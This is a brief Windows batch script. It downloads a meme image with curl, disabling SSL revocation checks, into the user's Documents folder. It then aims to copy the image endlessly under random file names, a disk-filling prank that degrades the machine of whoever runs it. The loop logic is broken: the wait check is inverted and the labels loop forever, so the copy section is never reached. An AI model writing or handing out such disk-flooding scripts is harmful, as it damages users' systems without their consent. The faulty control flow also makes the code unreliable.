

curl https://i.kym-cdn.com/entries/icons/facebook/000/038/173/ggccover.jpg --output %USERPROFILE%\Documents\gwa.jpg --ssl-no-revoke

:curlwait
IF EXISTS %USERPROFILE%\Documents\gwa.jpg goto curlwait
sleep.exe .1
goto waitend
:waitend

goto curlwait

:start
copy %USERPROFILE%\Documents\gwa.jpg %USERPROFILE%\Documents\%RANDOM%GwaGwaGwaGwaGwa%RANDOM%.jpg
goto start
